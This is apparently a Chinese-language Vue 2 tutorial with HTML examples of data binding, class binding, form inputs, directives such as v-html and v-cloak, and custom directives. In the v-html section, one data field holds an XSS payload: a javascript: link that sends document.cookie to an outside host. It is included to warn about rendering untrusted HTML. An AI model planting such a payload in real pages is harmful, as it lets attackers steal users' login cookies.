# Vue简单的数据绑定
~~~html
<div id="root">
    <!-- 元素内容可以通过{{}}包裹Vue对象data中的属性双向绑定或者js表达式 -->
    <h1 >hello, {{name}}</h1>


    <!-- 元素的属性可以通过v-bind绑定属性值是Vue对象中的属性（一般是data属性中的属性，也可以是methods中的函数调用获取函数返回值）或者js表达式，v-bind:可以简写为: -->
    <a v-bind:href="url">去百度</a>
    <!-- 注意v-bind是单向数据绑定，即data中的属性值发生变化影响元素属性值，元素属性值发生变化不影响data中的属性值 -->
    <input type="text" placeholder="单向数据绑定" v-bind:value="bind_test1" >
    <!-- v-model可以实现元素属性值和data中的属性值双向绑定
         但是v-model只能应用在表单类的元素上并且默认就是绑定的value属性值 
         所以v-model:value可以直接简写为 v-model
    -->
    <input type="text" placeholder="双向数据绑定" v-model:value="bind_test2" >
</div>


<script src="../js/vue.js"></script> <!-- vue2.7.16的源码，你需要手动下载放入指定目录下 -->
<script type="text/javascript">
    Vue.config.productionTip = false
    // 常见vue对象，简称vm对象，vm对象会代理内部data中的属性，即vm对象上会直接出现内部data中的属性并且查看和修改会互相影响
    var v=new Vue({
        // el属性是css选择器，只能选择绑定一个元素，不能绑定多个元素（当出现多个元素时只有第一个元素绑定成功）
        // 其实也可以在vue对象创建出来之后使用vue对象调用 $mount("#root")方法来指定 el 属性
        el: "#root",     
        // data提供el绑定元素的数据，包含它的后代元素
        // 其实dat也可以是一个函数，依靠该返回值靠提供数据（注意不要写箭头函数，这样它就不是vue对象的函数了）
        data: {          
            name: "张三",
            url: "https://www.baidu.com",
            bind_test1: "",
            bind_test2: ""
        }
    })
</script>
~~~

# class属性值绑定例子
~~~html
<style>
    .test1 {
        width: 200px;
        height: 200px;
        background-color: palegreen;
    }

    .test2 {
        border: orchid 5px solid;
    }

    .test3 {
        color: cornflowerblue;
    }
</style>

<div id="root">
    <!-- 通过v-bind绑定class属性其实是添加class -->
    <div class="test1" :class="mood" @click="changeMood">点击元素class属性添加绑定方式一</div>

    <!-- 绑定一个数组，数组元素表示多个class -->
    <div  class="test1" :class="classArr">绑定元素class属性方式二</div>

    <!-- 绑定一个对象，会将对象的属性名当作class，而属性值表示是否应用该class -->
    <div  class="test1" :class="classObj">绑定元素class属性方式三</div>
</div>


<script src="../js/vue.js"></script> <!-- vue2.7.16的源码，你需要手动下载放入指定目录下 -->
<script type="text/javascript">
    Vue.config.productionTip = false

    var v = new Vue({
        el: "#root",
        data: {
            mood: "",
            classArr: ["test2"],
            classObj: {
                test2: false,
                test3: true
            }
        },
        methods: {
            changeMood() {
                this.mood = "test2 test3"
            }
        },
    })
</script>
~~~

# Vue不同表单数据绑定
~~~html
<div id="root">
    <form @submit.prevent="demo"> <!--表单提交触发的事件-->
        账号：<input type="text" v-model.trim="userInfo.account"> <br/> <!--输入的内容默认去除首尾的空格-->
        密码：<input type="password" v-model="userInfo.password"><br/><!--输入的密码隐藏-->
        年龄：<input type="number" v-model.number="userInfo.age"><br/><!--数字类型的输入绑定-->
        性别：
        男<input type="radio" name="sex" v-model="userInfo.sex" value="男"> <!--注意单选或多选需要输入的值时需要添加默认的输入value-->
        女<input type="radio" name="sex" v-model="userInfo.sex" value="女"><br/>
        爱好：
        学习<input type="checkbox" v-model="userInfo.happy" value="学习"> <!--注意多选需要输入的值时需要添加默认的输入value-->
        打游戏<input type="checkbox" v-model="userInfo.happy" value="打游戏"> <!--并且多选绑定的vue数据属性必须是数组-->
        吃饭<input type="checkbox" v-model="userInfo.happy" value="吃饭"><br/>
        所属校区：
        <select v-model="userInfo.city"> <!--注意下拉框根据绑定的vue属性值选择value-->
            <option value="">请选择校区</option>
            <option value="beijing">北京</option>
            <option value="shanghai">上海</option>
            <option value="guangzhuo">广州</option>
            <option value="shenzhen">深圳</option>
            <option value="wuhan">武汉</option>
        </select><br /><br />
        其他信息：<textarea v-model.lazy="userInfo.other"></textarea> <br/> <!--输入框失去焦点时vue绑定输入的值-->
        <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="url">《用户协议》</a>
        <!--注意单选仅需要知道是否选择时可以不用添加默认的输入value-->
        <button>提交</button> <!--表单提交默认会跳转页面-->
    </form>
</div>


<script src="../js/vue.js"></script> <!-- vue2.7.16的源码，你需要手动下载放入指定目录下 -->
<script type="text/javascript">
    Vue.config.productionTip = false

    let buttonFormVm = new Vue({
        el: "#root",
        data: {
            userInfo: {
                account: "",
                password: "",
                age: "",
                sex: "",
                happy: [],
                city: "",
                other: "",
                agree: "",
            },
        },

        methods: {
            demo() {
                console.log(JSON.stringify(this.userInfo))
            }
        },
    })
</script>
~~~

# 其他不常见的数据绑定和指令
~~~html
<style>
    /* 隐藏带由v-cloak属性的元素，直到Vue的js库引入成功后vue自动去除标签的v-cloak属性*/
    [v-cloak] {
        display: none
    }
</style>

<div id="root">
    <!-- v-text设置元素内容被data属性数据进行纯文本替换 -->
    <div v-text="h3Text">这里的内容会被v-text的属性当成文本（即使文本是html）替换</div>
    <!-- v-html设置元素内容被data属性数据进行替换（如果是html文本会被解析为元素），
         注意一定不能使用用户的任何输入或者是数据库中的数据当成html解析，会引起XSS攻击 -->
    <div v-html="h3Html">这里的内容会被v-html的属性当成html解析替换</div>
    <!-- 例如以下是使用用户的任何输入或者是数据库中的数据当成html解析,
         当用户已经登录后如果点击该链接会向该链接的服务器发送已经登录的Cookie，从而盗走用户的Cookie
         Cookie设置HttpOnly可以有效的防止Cookie被盗走 -->
    <div v-html='xssa'>这里的内容会被v-html的属性当成html解析替换</div>

    <!-- 当Vue的js库引入速度慢的时候会出现模板还没有来得及渲染完毕就显示在页面上了，例如显示{{name}} 
         添加v-cloak属性配合css一起使用会直接隐藏带有v-cloak的标签，
         当Vue的js引入后生成真实DOM时会去除标签中的v-cloak属性从而显示渲染好的模板  -->
    <!-- <style> [v-cloak]{ display:none}</style> -->
    <div v-cloak>{{name}}</div>

    <!-- v-once指定的节点在初次动态的渲染后被认为是静态内容，不会再发生变化了 -->
    <div v-once>x的初始值是{{x}}</div>
    <div>当前的x值是{{x}}</div>
    <button @click="x++">点我x+1</button>
    <!-- 添加v-pre后Vue跳过了该标签的编译，所以该标签Vue无法影响 -->
    <div v-pre>x的初始值是{{x}}，由于添加了v-pre所以Vue跳过了该标签的编译，所以该标签Vue无法影响</div>

    <!-- 自定义指令 -->
    <div>当前的m值是{{m}}</div>
    <div>自定义指令v-big实现m放大10倍的值是<span v-big="m"></span></div>
    <button @click="m++">点我m+1</button>
    <div>当m发生变化时以下自定义的v-fbind指令所在的input标签会自动获取标签</div>
    <input type="text" v-fbind:value="m">
</div>


<script src="../js/vue.js"></script> <!-- vue2.7.16的源码，你需要手动下载放入指定目录下 -->
<script type="text/javascript">
    Vue.config.productionTip = false

    const v = new Vue({
        el: "#root",

        data: {
            h3Text: "<h3>v-text文本替换</h3>",
            h3Html: "<h3>v-html文本替换</h3>",
            // 注意不要出现这种html被解析，这样会导致用户的Cookie被盗走
            xssa: "<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>兄弟我找到你要的资源了，快来！</a>",
            name: "熔岩巨兽",
            x: 0,
            m: 1,
        },

        // 自定义指令，这是局部指令，如果需要设置全局指令请参考全局过滤器
        directives: {

            // 注意这里的指令名称不是v-big而是big，但是在标签中使用时还是v-big，
            // 如果标签需要的指令名称是v-bigName，请写成v-big-name，而函数名称请使用单引号写成'big-name'
            // 注意第一个参数是使用v-big指令的标签虚拟DOM
            // 第二个参数是一个对象，对象中的expression属性是v-big绑定的表达式，name是指令的简写名称，rawName是标签使用的指令名称
            // 注意自定义指令函数中的this是window而不是Vm实例，如果需要使用请通过第二个参数获取
            // 该函数在什么时候会被调用？1、自定义的指令与标签绑定成功时。2、指令所在模板被重新解析时
            // 简写其实相当于bind和update都是该函数，但是inserted未写
            big(element, binding) {
                element.innerText = binding.value * 10
            },


            fbind: {

                // 自定义的指令与标签绑定成功时，注意这个时候的element是虚拟DOM，这个时候不是真实DOM无法获取它的焦点
                bind(element, binding) {
                    element.value = binding.value
                },
                // 指令所在元素被插入页面时
                inserted(element, binding) {
                    element.focus()
                },
                // 指令所在模板被重新解析时调用
                update(element, binding) {
                    element.value = binding.value
                    element.focus()
                },

            }
        }

        // data存储数据函数式写法，data是个函数，该函数的返回值是最终的数据
        // data:function(){         
        //     return {
        //         name:"熔岩巨兽",
        //     }
        // }
    })
</script>
~~~



